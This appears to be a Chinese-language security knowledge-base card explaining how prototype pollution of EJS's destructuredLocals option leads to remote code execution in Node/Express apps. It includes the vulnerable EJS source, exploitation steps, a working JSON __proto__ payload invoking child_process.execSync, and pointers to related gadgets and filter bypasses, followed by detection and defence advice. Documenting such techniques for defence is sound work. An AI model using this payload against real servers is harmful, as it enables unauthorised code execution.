---
id: web-nodejs-prototype-pollution-ejs-destructuredlocals-rce
title: EJS destructuredLocals 原型污染注入：数组元素拼进模板函数体，闭合赋值语句执行 child_process
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: ejs-destructuredlocals-prototype-pollution-rce
aliases:
- EJS destructuredLocals
- destructuredLocals 原型污染
- EJS 模板 RCE 字段
- 原型链污染 EJS 新字段
- EJS 解构 locals 注入
tags:
- nodejs
- prototype-pollution
- ejs
- express
- rce
- template-engine
- destructuring
- javascript
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V560
  verified_at: '2026-11-12T07:42:06+08:00'
  notes: 已对照原文与img09-12核对：destructuredLocals数组元素经 name+' = __locals.'+name 拼接、a=a;闭合+//注释的PoC与调试截图一致；与既有outputFunctionName/lodash escapeFunction卡为不同字段不同payload，非同链，append_scenario成立；触发条件中EJS版本原写3.x起已按无实证改为3.x较新版本需按目标确认（原文未标版本，未设affected_versions）；未实际复现
---

## 一句话结论

EJS 编译模板时若 `opts.destructuredLocals` 是非空数组，会把每个元素原样拼成 `name + ' = __locals.' + name` 写进模板函数体（最终交给 `new Function`）；攻击者通过原型污染把 `Object.prototype.destructuredLocals` 设为 `["a=a;<命令执行代码>;//var __tmp2"]`，用 `a=a;` 闭合赋值、`//` 注释掉后半段拼接，即可在模板渲染时执行任意 Node 代码。

## 原理

- **EJS 源码拼接点**：`Template.prototype.generateSource` 中：
  ```js
  if (opts.destructuredLocals && opts.destructuredLocals.length) {
    var destructuring = '  var __locals = (' + opts.localsName + ' || {}),\n';
    for (var i = 0; i < opts.destructuredLocals.length; i++) {
      var name = opts.destructuredLocals[i];
      if (i > 0) destructuring += ',\n  ';
      destructuring += name + ' = __locals.' + name;
    }
    prepended += destructuring + ';\n';
  }
  ```
  每个数组元素被当作**标识符/赋值源码**直接拼接，没有任何转义或合法性校验。
- **原型污染取值**：EJS 通过 `opts.destructuredLocals` 读选项，选项对象沿原型链查找；只要应用存在任意原型污染原语（如把用户 JSON 递归 merge 进对象），污染 `Object.prototype.destructuredLocals` 后所有渲染都会命中该分支。
- **payload 构造**：数组元素 `a=a;global.process.mainModule.require('child_process').execSync('calc');//var __tmp2` 拼接后得到：
  ```js
  var __locals = (locals || {}),
  a=a;global.process.mainModule.require('child_process').execSync('calc');//var __tmp2 = __locals.a=a;...;//var __tmp2;
  ```
  `a=a;` 让赋值语句合法结束，随后执行命令；`//` 把 ` = __locals.` 及后面的重复拼接全部注释掉。
- **触发时机**：拼接结果进入 `src`，`fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src)` 编译，`fn.apply` 渲染时执行命令。

## 触发条件

- 应用使用 EJS 渲染模板，且 EJS 版本支持 `destructuredLocals` 选项（3.x 较新版本，具体小版本需按目标 EJS 源码确认）；
- 存在原型污染原语（递归 merge、深拷贝、JSON 解析后合并等），能把数组写入 `Object.prototype.destructuredLocals`；
- 攻击者能触发一次模板渲染（访问对应路由或用可控数据触发 render）。

## 利用步骤

1. 确认渲染引擎为 EJS（Express `res.render` + `.ejs`），并定位原型污染入口（如 `merge({}, JSON.parse(body))`）。
2. 污染 `Object.prototype.destructuredLocals` 为包含恶意元素的数组。
3. 访问渲染路由，观察命令执行（如弹计算器/写入文件）。
4. 若污染库过滤 `__proto__`，改用 `constructor.prototype` 等等价路径（见关联卡）。

## PoC

```json
{
  "__proto__": {
    "destructuredLocals": [
      "a=a;global.process.mainModule.require('child_process').execSync('calc');//var __tmp2"
    ]
  }
}
```

生成的模板函数体片段（调试器观察）：

```js
var __output = "";
function __append(s) { if (s !== undefined && s !== null) __output += s }
var __locals = (locals || {}),
a=a;global.process.mainModule.require('child_process').execSync('calc');//var __tmp2 = __locals.a=a;global...;//var __tmp2;
```

## 变体与关联

- EJS 其他可注入字段：`outputFunctionName` 见 [[web-nodejs-prototype-pollution-ejs-outputfunctionname-rce]]，`escapeFunction`/`escape` 见 [[web-nodejs-prototype-pollution-lodash-ejs-escapefunction-rce]]，`localsName` 见 [[web-nodejs-prototype-pollution-ejs-localsname-with-rce]]；
- 原型污染过滤绕过（constructor.prototype、嵌套键、Unicode）见 [[web-nodejs-prototype-pollution-filter-bypass]]；
- Jade/Pug 模板的 `line`/`self` gadget 见 [[web-nodejs-prototype-pollution-jade-line-debugitem-rce]]；
- `delimiter` 字段需要与行内容精确匹配才能进入拼接分支，暂未发现可控利用方式。

## 检测与防御

- 避免把用户可控数据递归 merge 进对象；使用 `Object.create(null)`、冻结 `Object.prototype`、schema 白名单校验；
- EJS 渲染时显式传入固定 options，不使用可被原型链影响的合并配置；
- 升级 EJS/依赖，关注原型污染 CVE；SAST 检查 `for...in` 深合并与 `__proto__`；
- 运行时检测模板函数体中异常拼接（EJS 调试模式下可审计 `src`），并对 child_process/require 调用做行为监控；
- WAF 侧对 JSON 中的 `__proto__`/`constructor.prototype` 键做拦截只能提高门槛，不能替代代码层修复。
